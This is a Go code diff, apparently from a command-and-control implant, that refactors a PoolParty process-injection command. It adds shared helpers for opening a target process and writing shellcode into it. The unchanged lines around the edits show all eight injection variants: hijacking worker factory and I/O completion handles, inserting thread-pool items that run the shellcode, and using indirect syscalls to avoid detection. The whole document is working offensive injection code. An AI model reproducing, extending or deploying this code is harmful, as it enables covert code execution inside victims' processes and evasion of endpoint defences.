@@ -108,27 +108,47 @@ func (c *PoolPartyInjectionCommand) Execute(task structs.Task) structs.CommandRe
 	return successResult(output)
 }
 
-// executeVariant1 implements Worker Factory Start Routine Overwrite
-func executeVariant1(shellcode []byte, pid uint32) (string, error) {
+// poolPartyProcessAccess is the standard access mask for all PoolParty variants.
+const poolPartyProcessAccess = windows.PROCESS_VM_READ | windows.PROCESS_VM_WRITE |
+	windows.PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | windows.PROCESS_QUERY_INFORMATION
+
+// poolPartyInit outputs the shared preamble and opens the target process.
+// Returns the process handle and accumulated output. Caller must defer injectCloseHandle.
+func poolPartyInit(variant int, desc string, shellcode []byte, pid uint32) (uintptr, string, error) {
 	var output string
-	output += "[*] PoolParty Variant 1: Worker Factory Start Routine Overwrite\n"
+	output += fmt.Sprintf("[*] PoolParty Variant %d: %s\n", variant, desc)
 	if IndirectSyscallsAvailable() {
 		output += "[*] Using indirect syscalls (Nt* via stubs)\n"
 	}
 	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
 	output += fmt.Sprintf("[*] Target PID: %d\n", pid)
 
-	// Step 1: Open target process
-	hProcess, err := injectOpenProcess(
-		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
-			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
-		pid,
-	)
+	hProcess, err := injectOpenProcess(poolPartyProcessAccess, pid)
 	if err != nil {
-		return output, fmt.Errorf("OpenProcess failed: %v", err)
+		return 0, output, fmt.Errorf("OpenProcess failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)
+	return hProcess, output, nil
+}
+
+// poolPartyAllocShellcode allocates, writes, and protects shellcode in the target process.
+// Returns the remote shellcode address and appends to output.
+func poolPartyAllocShellcode(hProcess uintptr, shellcode []byte, output string) (uintptr, string, error) {
+	addr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
+	if err != nil {
+		return 0, output, fmt.Errorf("shellcode injection failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Shellcode at: 0x%X (W^X: RW→RX)\n", addr)
+	return addr, output, nil
+}
+
+// executeVariant1 implements Worker Factory Start Routine Overwrite
+func executeVariant1(shellcode []byte, pid uint32) (string, error) {
+	hProcess, output, err := poolPartyInit(1, "Worker Factory Start Routine Overwrite", shellcode, pid)
+	if err != nil {
+		return output, err
 	}
 	defer injectCloseHandle(hProcess)
-	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)
 
 	// Step 2: Hijack TpWorkerFactory handle
 	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
@@ -179,25 +199,11 @@ func executeVariant1(shellcode []byte, pid uint32) (string, error) {
 
 // executeVariant2 implements TP_WORK Insertion
 func executeVariant2(shellcode []byte, pid uint32) (string, error) {
-	var output string
-	output += "[*] PoolParty Variant 2: TP_WORK Insertion\n"
-	if IndirectSyscallsAvailable() {
-		output += "[*] Using indirect syscalls (Nt* via stubs)\n"
-	}
-	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
-	output += fmt.Sprintf("[*] Target PID: %d\n", pid)
-
-	// Step 1: Open target process
-	hProcess, err := injectOpenProcess(
-		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
-			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
-		pid,
-	)
+	hProcess, output, err := poolPartyInit(2, "TP_WORK Insertion", shellcode, pid)
 	if err != nil {
-		return output, fmt.Errorf("OpenProcess failed: %v", err)
+		return output, err
 	}
 	defer injectCloseHandle(hProcess)
-	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)
 
 	// Step 2: Hijack TpWorkerFactory handle
 	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
@@ -243,11 +249,10 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	output += "[+] Read target process's task queue structure\n"
 
 	// Step 6+7: Allocate memory for shellcode and write with W^X protection
-	shellcodeAddr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
+	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output)
 	if err != nil {
-		return output, fmt.Errorf("shellcode alloc+write+protect failed: %v", err)
+		return output, err
 	}
-	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X (W^X: RW→RX)\n", shellcodeAddr)
 
 	// Step 8: Create TP_WORK structure via CreateThreadpoolWork (exactly as SafeBreach does)
 	pTpWork, _, err := procCreateThreadpoolWork.Call(
@@ -383,25 +388,11 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 
 // executeVariant3 implements TP_WAIT Insertion via Event signaling
 func executeVariant3(shellcode []byte, pid uint32) (string, error) {
-	var output string
-	output += "[*] PoolParty Variant 3: TP_WAIT Insertion\n"
-	if IndirectSyscallsAvailable() {
-		output += "[*] Using indirect syscalls (Nt* via stubs)\n"
-	}
-	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
-	output += fmt.Sprintf("[*] Target PID: %d\n", pid)
-
-	// Step 1: Open target process
-	hProcess, err := injectOpenProcess(
-		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
-			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
-		pid,
-	)
+	hProcess, output, err := poolPartyInit(3, "TP_WAIT Insertion", shellcode, pid)
 	if err != nil {
-		return output, fmt.Errorf("OpenProcess failed: %v", err)
+		return output, err
 	}
 	defer injectCloseHandle(hProcess)
-	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)
 
 	// Step 2: Hijack I/O completion port handle
 	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
@@ -412,11 +403,10 @@ func executeVariant3(shellcode []byte, pid uint32) (string, error) {
 	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)
 
 	// Step 3+4: Allocate memory for shellcode and write with W^X protection
-	shellcodeAddr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
+	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output)
 	if err != nil {
-		return output, fmt.Errorf("shellcode alloc+write+protect failed: %v", err)
+		return output, err
 	}
-	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X (W^X: RW→RX)\n", shellcodeAddr)
 
 	// Step 5: Create TP_WAIT structure via CreateThreadpoolWait
 	pTpWait, _, err := procCreateThreadpoolWait.Call(
@@ -507,25 +497,11 @@ func executeVariant3(shellcode []byte, pid uint32) (string, error) {
 
 // executeVariant4 implements TP_IO Insertion via File I/O completion
 func executeVariant4(shellcode []byte, pid uint32) (string, error) {
-	var output string
-	output += "[*] PoolParty Variant 4: TP_IO Insertion\n"
-	if IndirectSyscallsAvailable() {
-		output += "[*] Using indirect syscalls (Nt* via stubs)\n"
-	}
-	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
-	output += fmt.Sprintf("[*] Target PID: %d\n", pid)
-
-	// Step 1: Open target process
-	hProcess, err := injectOpenProcess(
-		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
-			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
-		pid,
-	)
+	hProcess, output, err := poolPartyInit(4, "TP_IO Insertion", shellcode, pid)
 	if err != nil {
-		return output, fmt.Errorf("OpenProcess failed: %v", err)
+		return output, err
 	}
 	defer injectCloseHandle(hProcess)
-	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)
 
 	// Step 2: Hijack I/O completion port handle
 	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
@@ -536,11 +512,10 @@ func executeVariant4(shellcode []byte, pid uint32) (string, error) {
 	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)
 
 	// Step 3+4: Allocate memory for shellcode and write with W^X protection
-	shellcodeAddr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
+	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output)
 	if err != nil {
-		return output, fmt.Errorf("shellcode alloc+write+protect failed: %v", err)
+		return output, err
 	}
-	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X (W^X: RW→RX)\n", shellcodeAddr)
 
 	// Step 5: Create file with overlapped flag for async I/O
 	fileName, _ := windows.UTF16PtrFromString("C:\\Windows\\Temp\\PoolParty.txt")
@@ -638,25 +613,11 @@ func executeVariant4(shellcode []byte, pid uint32) (string, error) {
 
 // executeVariant5 implements TP_ALPC Insertion via ALPC port messaging
 func executeVariant5(shellcode []byte, pid uint32) (string, error) {
-	var output string
-	output += "[*] PoolParty Variant 5: TP_ALPC Insertion\n"
-	if IndirectSyscallsAvailable() {
-		output += "[*] Using indirect syscalls (Nt* via stubs)\n"
-	}
-	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
-	output += fmt.Sprintf("[*] Target PID: %d\n", pid)
-
-	// Step 1: Open target process
-	hProcess, err := injectOpenProcess(
-		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
-			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
-		pid,
-	)
+	hProcess, output, err := poolPartyInit(5, "TP_ALPC Insertion", shellcode, pid)
 	if err != nil {
-		return output, fmt.Errorf("OpenProcess failed: %v", err)
+		return output, err
 	}
 	defer injectCloseHandle(hProcess)
-	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)
 
 	// Step 2: Hijack I/O completion port handle
 	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
@@ -667,11 +628,10 @@ func executeVariant5(shellcode []byte, pid uint32) (string, error) {
 	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)
 
 	// Step 3+4: Allocate memory for shellcode and write with W^X protection
-	shellcodeAddr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
+	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output)
 	if err != nil {
-		return output, fmt.Errorf("shellcode alloc+write+protect failed: %v", err)
+		return output, err
 	}
-	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X (W^X: RW→RX)\n", shellcodeAddr)
 
 	// Step 5: Create a temporary ALPC port for TpAllocAlpcCompletion
 	var hTempAlpc uintptr
@@ -807,25 +767,11 @@ func executeVariant5(shellcode []byte, pid uint32) (string, error) {
 
 // executeVariant6 implements TP_JOB Insertion via Job object assignment
 func executeVariant6(shellcode []byte, pid uint32) (string, error) {
-	var output string
-	output += "[*] PoolParty Variant 6: TP_JOB Insertion\n"
-	if IndirectSyscallsAvailable() {
-		output += "[*] Using indirect syscalls (Nt* via stubs)\n"
-	}
-	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
-	output += fmt.Sprintf("[*] Target PID: %d\n", pid)
-
-	// Step 1: Open target process
-	hProcess, err := injectOpenProcess(
-		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
-			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
-		pid,
-	)
+	hProcess, output, err := poolPartyInit(6, "TP_JOB Insertion", shellcode, pid)
 	if err != nil {
-		return output, fmt.Errorf("OpenProcess failed: %v", err)
+		return output, err
 	}
 	defer injectCloseHandle(hProcess)
-	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)
 
 	// Step 2: Hijack I/O completion port handle
 	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
@@ -836,11 +782,10 @@ func executeVariant6(shellcode []byte, pid uint32) (string, error) {
 	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)
 
 	// Step 3+4: Allocate memory for shellcode and write with W^X protection
-	shellcodeAddr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
+	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output)
 	if err != nil {
-		return output, fmt.Errorf("shellcode alloc+write+protect failed: %v", err)
+		return output, err
 	}
-	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X (W^X: RW→RX)\n", shellcodeAddr)
 
 	// Step 5: Create job object
 	jobName := fmt.Sprintf("PoolPartyJob%d", pid)
@@ -931,24 +876,11 @@ func executeVariant6(shellcode []byte, pid uint32) (string, error) {
 
 // executeVariant7 implements TP_DIRECT Insertion via I/O Completion Port
 func executeVariant7(shellcode []byte, pid uint32) (string, error) {
-	var output string
-	output += "[*] PoolParty Variant 7: TP_DIRECT Insertion\n"
-	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
-	output += fmt.Sprintf("[*] Target PID: %d\n", pid)
-
-	if IndirectSyscallsAvailable() {
-		output += "[*] Using indirect syscalls (Nt* via stubs)\n"
-	}
-
-	// Step 1: Open target process
-	desiredAccess := uint32(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
-		PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION)
-	hProcess, err := injectOpenProcess(desiredAccess, pid)
+	hProcess, output, err := poolPartyInit(7, "TP_DIRECT Insertion", shellcode, pid)
 	if err != nil {
 		return output, err
 	}
 	defer injectCloseHandle(hProcess)
-	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)
 
 	// Step 2: Hijack IoCompletion handle
 	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
@@ -959,11 +891,10 @@ func executeVariant7(shellcode []byte, pid uint32) (string, error) {
 	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)
 
 	// Step 3: Allocate and write shellcode (W^X: RW → write → RX)
-	shellcodeAddr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
+	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output)
 	if err != nil {
-		return output, fmt.Errorf("shellcode injection failed: %v", err)
+		return output, err
 	}
-	output += fmt.Sprintf("[+] Shellcode at: 0x%X (W^X: RW→RX)\n", shellcodeAddr)
 
 	// Step 4: Create and write TP_DIRECT structure
 	tpDirect := TP_DIRECT{
@@ -1000,24 +931,11 @@ func executeVariant7(shellcode []byte, pid uint32) (string, error) {
 
 // executeVariant8 implements TP_TIMER Insertion - Variant 8
 func executeVariant8(shellcode []byte, pid uint32) (string, error) {
-	var output string
-	output = fmt.Sprintf("[*] PoolParty Variant 8: TP_TIMER Insertion\n")
-	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
-	output += fmt.Sprintf("[*] Target PID: %d\n", pid)
-
-	if IndirectSyscallsAvailable() {
-		output += "[*] Using indirect syscalls (Nt* via stubs)\n"
-	}
-
-	// Step 1: Open target process
-	desiredAccess := uint32(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
-		PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION)
-	hProcess, err := injectOpenProcess(desiredAccess, pid)
+	hProcess, output, err := poolPartyInit(8, "TP_TIMER Insertion", shellcode, pid)
 	if err != nil {
 		return output, err
 	}
 	defer injectCloseHandle(hProcess)
-	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)
 
 	// Step 2: Hijack worker factory handle
 	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
@@ -1051,11 +969,10 @@ func executeVariant8(shellcode []byte, pid uint32) (string, error) {
 	output += fmt.Sprintf("[+] Worker factory start parameter (TP_POOL): 0x%X\n", workerFactoryInfo.StartParameter)
 
 	// Step 5: Allocate and write shellcode (W^X: RW → write → RX)
-	shellcodeAddr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
+	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output)
 	if err != nil {
-		return output, fmt.Errorf("shellcode injection failed: %v", err)
+		return output, err
 	}
-	output += fmt.Sprintf("[+] Shellcode at: 0x%X (W^X: RW→RX)\n", shellcodeAddr)
 
 	// Step 6: Create TP_TIMER structure via CreateThreadpoolTimer
 	pTpTimer, _, err := procCreateThreadpoolTimer.Call(
